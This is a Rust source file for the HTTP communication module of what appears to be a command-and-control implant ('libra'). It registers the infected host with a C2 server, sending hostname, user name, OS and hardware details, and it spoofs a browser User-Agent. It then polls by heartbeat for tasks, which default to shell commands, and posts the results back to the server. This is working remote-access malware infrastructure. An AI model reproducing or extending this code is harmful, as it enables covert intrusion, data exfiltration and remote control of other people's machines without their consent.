//! HTTP communicator — registration, heartbeat polling, result submission.
//! Port of HttpCommunicator.cs.

use libra_common::models::AgentTask;
use reqwest::Client;

/// HTTP communicator for beacon-style communication with the C2 server.
pub struct HttpCommunicator {
    client: Client,
    server_url: String,
    register_path: String,
    heartbeat_path: String,
    result_path: String,
}

impl HttpCommunicator {
    pub fn new(
        server_url: &str,
        register_path: &str,
        heartbeat_path: &str,
        result_path: &str,
    ) -> Self {
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .unwrap_or_else(|e| {
                eprintln!("[http] Failed to create HTTP client with custom UA, using default: {}", e);
                Client::new()
            });

        Self {
            client,
            server_url: server_url.to_string(),
            register_path: register_path.to_string(),
            heartbeat_path: heartbeat_path.to_string(),
            result_path: result_path.to_string(),
        }
    }

    fn register_url(&self) -> String {
        format!("{}{}", self.server_url, self.register_path)
    }

    fn heartbeat_url(&self) -> String {
        format!("{}{}", self.server_url, self.heartbeat_path)
    }

    fn result_url(&self) -> String {
        format!("{}{}", self.server_url, self.result_path)
    }

    /// Register with the C2 server. Returns the assigned agent_id on success.
    pub async fn register(
        &self,
        hostname: &str,
        user_name: &str,
        os_version: &str,
        arch: &str,
        public_key: &str,
        hardware_json: &str,
    ) -> Result<String, String> {
        let pid = std::process::id();
        let hw = if hardware_json.is_empty() || hardware_json == "null" {
            "null"
        } else {
            hardware_json
        };

        let json = format!(
            r#"{{"hostname":"{}","userName":"{}","osVersion":"{}","arch":"{}","processName":"agent","pid":{},"isElevated":false,"publicKey":"{}","hardware":{}}}"#,
            escape(hostname),
            escape(user_name),
            escape(os_version),
            escape(arch),
            pid,
            escape(public_key),
            hw
        );

        let resp = self
            .client
            .post(self.register_url())
            .header("Content-Type", "application/json")
            .body(json)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !resp.status().is_success() {
            return Err(format!("Registration failed with status: {}", resp.status()));
        }

        let body = resp.text().await.map_err(|e| e.to_string())?;
        extract_string(&body, "agent_id").ok_or_else(|| "agent_id not found in response".into())
    }

    /// Send a heartbeat and receive a pending task (if any).
    pub async fn heartbeat(&self, agent_id: &str) -> Result<Option<AgentTask>, String> {
        let resp = self
            .client
            .post(self.heartbeat_url())
            .header("X-Agent-Id", agent_id)
            .header("Content-Type", "application/json")
            .body("{}")
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !resp.status().is_success() {
            return Err(format!("Heartbeat failed: {}", resp.status()));
        }

        let body = resp.text().await.map_err(|e| e.to_string())?;

        let v: serde_json::Value = serde_json::from_str(&body)
            .map_err(|e| format!("Failed to parse heartbeat response: {}", e))?;

        match v.get("pendingTask") {
            Some(task_val) if !task_val.is_null() => {
                let task_json = serde_json::to_string(task_val)
                    .map_err(|e| format!("Failed to serialize pendingTask: {}", e))?;
                Ok(Some(parse_task(&task_json)))
            }
            _ => Ok(None),
        }
    }

    /// Submit task result back to the C2 server.
    pub async fn submit_result(
        &self,
        agent_id: &str,
        result_json: &str,
    ) -> Result<(), String> {
        self.client
            .post(self.result_url())
            .header("X-Agent-Id", agent_id)
            .header("Content-Type", "application/json")
            .body(result_json.to_string())
            .send()
            .await
            .map_err(|e| e.to_string())?;
        Ok(())
    }
}

// ── JSON extraction helpers ──────────────────────────────────────────

fn escape(s: &str) -> String {
    libra_common::json_util::escape_json(s)
}

fn extract_string(json: &str, key: &str) -> Option<String> {
    let v: serde_json::Value = serde_json::from_str(json).ok()?;
    v.get(key)?.as_str().map(|s| s.to_string())
}

fn parse_task(json: &str) -> AgentTask {
    match serde_json::from_str::<AgentTask>(json) {
        Ok(task) => task,
        Err(_) => {
            // Fallback: parse from Value for partial compatibility
            let v: serde_json::Value = serde_json::from_str(json).unwrap_or(serde_json::Value::Null);
            use libra_common::models::{CommandType, TaskStatus};
            AgentTask {
                id: v["id"].as_str().unwrap_or_default().to_string(),
                agent_id: v["agentId"].as_str().unwrap_or_default().to_string(),
                created_by: v["createdBy"].as_str().unwrap_or_default().to_string(),
                command: v["command"].as_str().unwrap_or_default().to_string(),
                command_type: v["commandType"].as_str()
                    .and_then(|s| serde_json::from_str::<CommandType>(&format!("\"{}\"", s)).ok())
                    .unwrap_or(CommandType::Shell),
                arguments: Vec::new(),
                status: v["status"].as_str()
                    .and_then(|s| serde_json::from_str::<TaskStatus>(&format!("\"{}\"", s)).ok())
                    .unwrap_or(TaskStatus::Pending),
                output: v["output"].as_str().map(|s| s.to_string()),
                error: v["error"].as_str().map(|s| s.to_string()),
                timeout_seconds: v["timeoutSeconds"].as_i64().unwrap_or(60) as i32,
            }
        }
    }
}
